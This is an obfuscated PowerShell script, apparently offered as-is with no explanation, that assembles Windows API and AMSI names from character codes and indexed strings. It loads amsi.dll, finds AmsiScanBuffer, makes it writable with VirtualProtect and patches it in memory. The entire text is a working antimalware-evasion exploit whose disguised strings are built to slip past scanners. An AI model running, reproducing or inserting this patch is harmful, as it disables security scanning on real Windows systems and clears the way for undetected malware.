$K = (-join [char[]](40)+[char](34)+[char](107)) + (-join ([String]''.LastIndexOfAny)[11, 124, 9, 11]) + (-join [char[]](108)+[char](51)+[char](50)+[char](34)+[char](41)+[char](93)); $Vz = (-join [char[]](86)+[char](105)+[char](114)) +  (-join ([String]''.LastIndexOfAny)[86,139,5]) + (-join [char[]](108)+[char](80)+[char](114)+[char](111)+[char](116)+[char](101)+[char](99)+[char](116)); $AD = (-join [char[]](97)+[char](109)+[char](115)+[char](105)+[char](46)) + (-join ([String]''.LastIndexOfAny)[10]) + (-join $vERBOsepreFErEncE.tOStRIng()[6, 6]); $AS = (-join [char[]](65)+[char](109)+[char](115)+[char](105)+[char](83)) + (-join ([String]''.LastIndexOfAny)[137,5,9]) + (-join [char[]](66)+[char](117)+[char](102)+[char](102)+[char](101)+[char](114)); $LL =  (-join [char[]](76)+[char](111)) +  (-join ([String]''.LastIndexOfAny)[5,10,4,0]) + (-join [char[]](98)+[char](114)+[char](97)+[char](114)+[char](121)); $GA = (-join [char[]](71)+[char](101)+[char](116)+[char](80)) + (-join ([String]''.LastIndexOfAny)[22]) + (-join [char[]](111)+[char](99)+[char](65)) + (-join ([String]''.LastIndexOfAny)[10, 10, 22, 11, 121, 121]); $Cd = @'
using System;
using System.Runtime.InteropServices;
public class A {
[DllImport###
public static extern IntPtr ?(string name);
[DllImport###
public static extern IntPtr *(IntPtr hModule, string procName);
[DllImport###
public static extern bool !(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);}
'@.replace('###', $K).replace('!', $Vz).replace('?', $LL).replace('*', $GA); Add-Type $Cd; $ADD = [A]::$LL($AD); $ASD = [A]::$GA($ADD, $AS); $ET = [Byte[]] ( 0xc3, 0x80, 0x07, 0x00,0x57, 0xb8 ); $out = 0; [A]::$Vz($ASD, [uint32]$ET.Length, 0x40, [ref] $out); [System.Runtime.InteropServices.Marshal]::Copy($ET, 0, $ASD, $ET.Length); [A]::$Vz($ASD, [uint32]$ET.Length, $out, [ref] $null)
